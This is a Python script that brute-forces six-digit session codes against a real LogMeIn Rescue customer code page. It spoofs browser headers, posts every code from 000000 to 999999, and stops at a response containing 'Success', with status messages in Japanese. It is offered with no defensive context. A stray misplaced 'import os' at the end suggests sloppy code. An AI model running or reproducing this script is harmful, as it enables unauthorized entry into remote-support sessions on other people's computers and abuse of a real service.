import requests
import time

url = "https://secure.logmeinrescue.com/Customer/Code.aspx"
session = requests.Session()

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Referer": "https://secure.logmeinrescue.com/Customer/Code.aspx"
}

for i in range(1000000):
    code = f"{i:06}"

    payload = {
        "Code": code,
        "IsEmbeddedInFrame": "false",
        "maxTouchPoints": "0"
    }

    try:
        response = session.post(url, data=payload, headers=headers)
        
        if "Success" in response.text: 
            print(f"[*] 成功したコードを見つけました: {code}")
            break
        
        print(f"Testing: {code} - Status: {response.status_code}")

        time.sleep(0.1)

    except Exception as e:
        print(f"エラー: {e}")
        break
    import os 
